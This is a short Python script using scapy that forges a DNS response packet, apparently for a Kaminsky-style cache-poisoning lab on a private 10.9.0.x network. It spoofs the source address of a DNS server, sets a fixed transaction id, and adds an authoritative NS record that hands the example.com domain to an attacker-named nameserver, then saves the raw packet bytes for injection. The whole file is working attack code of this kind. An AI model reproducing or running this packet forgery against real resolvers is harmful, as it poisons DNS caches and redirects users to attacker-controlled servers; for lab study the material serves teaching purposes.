from scapy.all import *

name = "rando.example.com"
domain = "example.com"
ns = "ns.poopypawslin.com"

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type="A", rdata="1.2.3.4", ttl=259200)
NSsec = DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)

ip = IP(dst="10.9.0.153", src="10.9.0.53")
udp = UDP(dport=33333, sport=53, chksum=0)

reply = ip/udp/dns

with open("ip_resp.bin", "wb") as f:
	f.write(bytes(reply))
